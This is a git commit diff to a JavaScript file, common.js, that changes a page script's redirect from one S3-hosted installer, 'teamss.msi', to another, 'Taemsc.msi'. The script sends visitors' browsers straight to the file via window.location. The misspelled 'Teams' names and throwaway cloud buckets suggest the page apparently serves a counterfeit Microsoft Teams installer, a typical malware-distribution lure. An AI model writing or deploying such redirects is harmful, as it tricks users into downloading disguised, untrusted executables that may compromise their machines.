6ca534496f249e3c398c4e4b501d0cb177874017
haaerhawe <abdulalim45678876322@gmail.com>
2025-08-02 11:33:58 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
+		var url="https://amnn1.s3.us-east-1.amazonaws.com/Taemsc.msi";
 		window.location=url;
 	}
 }
@@ -11,4 +11,5 @@ var num=0;
 function getLoad()
 {
 	num++;
+
 }
